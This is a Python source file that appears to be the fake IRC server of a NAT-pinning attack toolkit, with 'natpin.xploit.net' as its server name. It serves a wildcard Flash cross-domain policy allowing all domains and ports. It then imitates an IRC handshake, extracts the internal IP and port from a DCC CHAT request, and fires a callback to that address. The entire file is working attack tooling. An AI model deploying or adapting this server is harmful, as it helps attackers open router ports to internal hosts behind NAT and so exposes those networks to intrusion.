#!/usr/bin/env python
#filename=irc.py
from base import *
import socket
import random
import struct
import select

class Server(Base):
	def __init__(self,serverPort=6667,sCallbackType="socket"):
		Base.__init__(self,"TCP",serverPort,sCallbackType)
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
	#end def
	def protocolhandler(self,conn, addr):
		#we just received a new connection at this point
		# FLASH POLICY FILE SUPPORT
		ready = select.select([conn], [], [], 1)
		if ready[0]:
			request = conn.recv(1024).strip()
			if (request[:22]=="<policy-file-request/>"):
				conn.send("""<?xml version="1.0"?>
	<!DOCTYPE cross-domain-policy SYSTEM "/xml/dtds/cross-domain-policy.dtd">
	<cross-domain-policy> 
			<site-control permitted-cross-domain-policies="master-only"/>
			<allow-access-from domain="*" to-ports="*" />
	</cross-domain-policy>\x00""")
				conn.close()
				return None
		else:
			#send initial IRC server data
			IRC_NAME="natpin.xploit.net"
			conn.send(IRC_NAME + " NOTICE AUTH :*** Looking up your hostname...\r\n")
		while True:
			request = conn.recv(1024).strip()
			parts = request.split(" ")
			if parts[0]=="NICK":
				conn.send(":"+IRC_NAME+" 376 natpin252 :End of /MOTD command.\r\n")
			elif parts[0]=="PRIVMSG":
				if parts[3] == "CHAT":
					numip = long(parts[5])
					numip = socket.inet_ntoa(struct.pack('!I', numip))		
					numport = parts[6].replace("\x01","")
					self.log("IRC Received DCC CHAT callback request for " + str(numip) + " on port " + str(numport))
					#this is where callback needs to happen
					self.callback("IRC", self.CB_TYPE,numip,int(numport))
					if self.EXIT_ON_CB == 1:
						break
			#end if
	#end def
#end class
